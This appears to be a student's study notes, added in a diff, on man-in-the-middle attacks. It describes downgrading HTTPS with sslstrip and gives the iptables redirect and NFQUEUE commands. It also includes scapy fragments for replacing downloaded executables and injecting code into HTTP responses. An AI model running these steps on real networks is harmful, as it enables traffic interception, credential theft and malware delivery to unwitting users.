@@ -1,0 +1,30 @@
+We use a tool named ssl strip to downgrade the HTTPS connections to HTTP
+
+The tool is applicable for websites that use HTTPS and not HSTS
+
+HSTS: The browser has a preset rule of websites that it will only load in https like facebook
+
+PACKET_SNIFFER:
+#Commands:
+
+iptables is used bcause ssl strip wokrs on port 10000
+
+$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+REPLACE DOWNLOADERS:
+
+$ iptables -I INPUT -j NFQUEUE --queue-num 0 
+$ iptables -I OUTPUT -j NFQUEUE --queue-num 0 
+$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+in replace downloads file we will replace dport and sport : 10000   -- > cuz ssl strip will leave and send packets thorugh port 10000
+
+    check exe    and "10.0.2.16' not in scapy_packet[scapy.Raw].Load
+
+CODE INJECTOR:
+
+we need to replace HTTP  1.1 with HTTP 1.0
+
+after Accpet encdoing line
+
+load=load.replace("HTTP/1.1","HTTP/1.0")  http1.1 sends data in chunk, if respond is sent in chucks we dont have a content length hence we will casue the server to send data in http1.0
